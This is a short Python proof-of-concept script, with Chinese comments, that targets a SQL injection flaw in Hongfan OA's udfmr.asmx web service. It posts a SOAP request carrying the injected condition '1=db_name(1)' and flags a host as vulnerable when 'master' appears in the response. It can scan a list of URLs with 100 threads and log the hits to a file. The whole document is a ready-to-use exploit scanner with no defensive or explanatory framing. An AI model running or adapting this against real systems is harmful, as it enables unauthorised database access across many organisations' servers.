#红帆OA udfmr.asmx SQL注入漏洞

import requests,sys,argparse,re,json
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()

def banner():
     test=""" """
     print(test)

def main():
    banner()
    parsers=argparse.ArgumentParser(description='红帆OA udfmr.asmx SQL注入漏洞')
    parsers.add_argument('-u','--url',dest='url',type=str,help='please input your url')
    parsers.add_argument('-f','--file',dest='file',type=str,help='please input your filepath')
    args=parsers.parse_args()

    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list=[]
        with open(args.file,'r',encoding='utf-8') as fp:
            for url in fp.readlines():
                url_list.append(url.strip())
        mp=Pool(100)
        #mp.map(poc, url_list) 的作用是并行地对 url_list 中的每个 URL 执行 poc 函数（或方法）
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"usag:\n\t python {sys.argv[0]} -h")
def poc(target):
    
    payload="/iOffice/prg/set/wss/udfmr.asmx"

    headers={
       'Content-Type':'text/xml; charset=utf-8',
        'Content-Length':'386',
        'SOAPAction':'"http://tempuri.org/ioffice/udfmr/GetEmpSearch"',
    }
    data='''
            <?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <GetEmpSearch xmlns="http://tempuri.org/ioffice/udfmr">
      <condition>1=db_name(1)</condition>
    </GetEmpSearch>
  </soap:Body>
</soap:Envelope>
'''

    try:
        res1=requests.post(url=target+payload,headers=headers,verify=False,data=data)
        if  'master' in res1.text:
                    print(f"[+]目标存在 {target}")
                    with open('result.txt','a') as f:
                        f.write(target+'\n')
        else:
             print(f'[-]目标不存在漏洞 {target}')
    except:
        pass


if __name__ == '__main__':
    main()


